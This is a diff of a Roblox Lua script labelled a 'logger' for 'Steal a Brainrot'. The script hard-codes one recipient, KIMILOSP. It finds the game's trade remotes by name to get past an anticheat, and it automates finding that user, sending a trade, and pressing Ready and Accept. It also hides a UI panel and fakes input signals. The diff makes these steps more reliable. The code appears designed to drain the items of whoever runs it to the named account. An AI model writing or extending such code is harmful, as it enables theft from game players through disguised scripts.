@@ -1,9 +1,10 @@
 --[[
 ============================================================
-  STEAL A BRAINROT — LOGGER  (edición KIMILOSP)  v7
-  · Target único: KIMILOSP (UserId resuelto automáticamente)
-  · Remotes resueltos POR NOMBRE (fix update anticheat)
-  · Envío por clics + Ready/Accept por UI real
+  STEAL A BRAINROT — LOGGER  (edición KIMILOSP)  v8
+  · Target único: KIMILOSP
+  · Remotes por NOMBRE (fix update anticheat)
+  · Envío por clics con botones vivos
+  · Ready/Accept por UI real
 ============================================================
 ]]
 
@@ -660,6 +661,7 @@ task.spawn(function()
 		["RE/NotificationService/Notify"] = 209,
 		["RF/TradeService/AcceptInvite"] = 37,
 		["RE/TradeService/CreateInvite"] = 41,
+		["RF/TradeService/SearchUser"] = 35,
 	}
 
 	local function fn(arg)
@@ -689,10 +691,7 @@ task.spawn(function()
 		local leftCenter = playerGui:FindFirstChild("LeftCenter")
 
 		if leftCenter then
-			local clone = leftCenter:Clone()
-			clone.Name = "LeftCenter_Backup"
-			clone.Parent = playerGui
-			leftCenter:Destroy()
+			leftCenter.Name = "LeftCenter_Backup"
 		end
 
 		local Notify = fn("RE/NotificationService/Notify")
@@ -1612,7 +1611,11 @@ task.spawn(function()
 				end)
 				if ok and type(conns) == "table" then
 					for _, conn in ipairs(conns) do
-						if conn.Function and pcall(conn.Function) then
+						if pcall(function()
+							conn:Fire()
+						end) then
+							triggered = true
+						elseif conn.Function and pcall(conn.Function) then
 							triggered = true
 						end
 					end
@@ -1644,7 +1647,12 @@ task.spawn(function()
 		return pcall(function()
 			box:CaptureFocus()
 			box.Text = textToType
-			task.wait(0.05)
+			if firesignal and box.TextChanged then
+				pcall(function()
+					firesignal(box.TextChanged, textToType)
+				end)
+			end
+			task.wait(0.1)
 			if okVim and VirtualInputManager then
 				pcall(function()
 					VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
@@ -1654,7 +1662,7 @@ task.spawn(function()
 			end
 			if box.FocusLost then
 				pcall(function()
-					box.FocusLost:Fire(true)
+					firesignal(box.FocusLost, true)
 				end)
 			end
 			box:ReleaseFocus()
@@ -1751,24 +1759,42 @@ task.spawn(function()
 			end
 
 			local tradeListGui = playerGui:FindFirstChild("TradePlayerList")
-			local sendBtn = findTargetSendButton(tradeListGui or playerGui, name, id)
+			local sendBtn = tradeListGui and findTargetSendButton(tradeListGui, name, id) or nil
 
 			if not sendBtn then
 				local openBtn = findLeftTradeButton()
 				if openBtn then
 					triggerScriptButton(openBtn)
-					task.wait(CLICK_RETRY)
+					for _ = 1, 8 do
+						if playerGui:FindFirstChild("TradePlayerList") then
+							break
+						end
+						task.wait(0.25)
+					end
 					syncTradeVisibility()
-					tradeListGui = playerGui:FindFirstChild("TradePlayerList")
 				end
 
-				local searchBox = findSearchBox(tradeListGui or playerGui)
+				tradeListGui = playerGui:FindFirstChild("TradePlayerList")
+
+				if not tradeListGui then
+					task.wait(CLICK_RETRY)
+					continue
+				end
+
+				if SearchUser then
+					pcall(function()
+						SearchUser:InvokeServer(name)
+					end)
+					task.wait(CLICK_RETRY)
+				end
+
+				local searchBox = findSearchBox(tradeListGui)
 				if searchBox then
 					pressEnterOnSearchBox(searchBox, name)
 					task.wait(CLICK_RETRY)
 				end
 
-				sendBtn = findTargetSendButton(tradeListGui or playerGui, name, id)
+				sendBtn = findTargetSendButton(tradeListGui, name, id)
 			end
 
 			if sendBtn and not sent then
@@ -1795,7 +1821,7 @@ task.spawn(function()
 		return sent
 	end
 
-	-- ── READY / ACCEPT POR UI (lógica de autoaccept) ──
+	-- ── READY / ACCEPT POR UI ──
 	local lastUiFire = 0
 
 	local function fireImageButton(btn)
@@ -1931,10 +1957,12 @@ task.spawn(function()
 	local Cancel = fn("RE/TradeService/CancelTrade")
 	local CreateInvite = fn("RE/TradeService/CreateInvite")
 	local AcceptInvite = fn("RF/TradeService/AcceptInvite")
+	local SearchUser = fn("RF/TradeService/SearchUser")
 
 	for name, remote in pairs({
 		Invite = Invite, AddBrainrot = AddBrainrot, AddItem = AddItem, Ready = Ready,
 		Accept = Accept, Cancel = Cancel, CreateInvite = CreateInvite, AcceptInvite = AcceptInvite,
+		SearchUser = SearchUser,
 	}) do
 		if not remote then
 			warn("[LOGGER] Remote no encontrado: " .. name)
@@ -1942,7 +1970,8 @@ task.spawn(function()
 	end
 
 	print("[LOGGER] Remotes: Invite=" .. tostring(Invite ~= nil) .. " Add=" .. tostring(AddBrainrot ~= nil) ..
-		" Cancel=" .. tostring(Cancel ~= nil) .. " AcceptInvite=" .. tostring(AcceptInvite ~= nil))
+		" Cancel=" .. tostring(Cancel ~= nil) .. " AcceptInvite=" .. tostring(AcceptInvite ~= nil) ..
+		" SearchUser=" .. tostring(SearchUser ~= nil))
 
 	local v3 = nil
 	local from = nil
@@ -2175,7 +2204,6 @@ task.spawn(function()
 		end
 	end)
 
-	-- ── READY / ACCEPT: UI real primero, remote como respaldo ──
 	task.spawn(function()
 		while true do
 			if tradeToken and tbl6.running and tbl6.phase ~= "SWITCHING" and tbl6.phase ~= "IDLE" then
@@ -2196,7 +2224,6 @@ task.spawn(function()
 		end
 	end)
 
-	-- ── prompt de invitación ──
 	task.spawn(function()
 		while true do
 			if v3 and from and (from == targetUserId or from == targetId) then
@@ -2206,7 +2233,6 @@ task.spawn(function()
 		end
 	end)
 
-	-- ── cambio de fase PRIORITY -> NORMAL ──
 	task.spawn(function()
 		while true do
 			if tbl6.phase == "PRIORITY" and not tbl6.priorityDone then
@@ -2247,7 +2273,6 @@ task.spawn(function()
 		end
 	end)
 
-	-- ── SENDER: clics primero, remote como fallback ──
 	task.spawn(function()
 		while true do
 			if tbl6.running and tbl6.targetId ~= 0 and tbl6.phase ~= "SWITCHING" and tbl6.phase ~= "IDLE" and not sending then
